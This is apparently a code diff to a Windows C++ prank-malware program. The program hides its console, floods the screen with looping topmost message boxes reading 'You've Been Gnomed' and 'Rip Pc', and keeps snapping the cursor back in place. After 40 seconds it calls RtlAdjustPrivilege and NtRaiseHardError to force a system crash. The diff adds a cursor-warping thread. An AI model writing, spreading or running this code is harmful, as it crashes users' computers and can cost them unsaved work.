@@ -1,4 +1,5 @@
 #include <thread>
+#include <iostream>
 #include <conio.h>
 #include <windows.h>
 #include <synchapi.h>
@@ -27,29 +28,28 @@ EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus,
 
 
 
-void payload() {
 
+void WarpCursor() {
+	POINT cursor;
 	while (true) {
+		GetCursorPos(&cursor);
+		Sleep(5'000);
+		SetCursorPos(
+			cursor.x,
+			cursor.y
+		);
+	}
+	}
 
+
+void payload() {
+	while(true) {
 		MessageBoxA(0, "You'e Been Gnomed", "You've Been Gnomed", MB_TOPMOST | MB_ABORTRETRYIGNORE);
 		MessageBoxA(0, "Rip Pc", "F", MB_TOPMOST | MB_ABORTRETRYIGNORE);	
 		MessageBeep(MB_ICONINFORMATION);
-
-
 	}
 }
 
-void MoveCursor(LPPOINT cursor, int x, int y) {
-
-
-	SetCursorPos	(
-
-		x + (rand() % 3 - 1),
-		y + (rand() % 3 - 1)
-
-	);
-
-}
 
 int main() {
 	BOOLEAN bl;
@@ -59,14 +59,11 @@ int main() {
 	GetCursorPos(&cursor);
 	int x = cursor.x;
 	int y = cursor.y;
+	std::cout << "ghskj\n";
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	
 	std::thread t1 (payload);
-	while (true)
-	{
-
-		MoveCursor(&cursor, x, y);
-
+	std::thread t2(WarpCursor);
 
 		Sleep(40'000);
 		RtlAdjustPrivilege(19, true, false, &bl);
@@ -74,6 +71,6 @@ int main() {
 		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
 
 		t1.join();
-	}
+		t2.join();
 	return 0;
 }
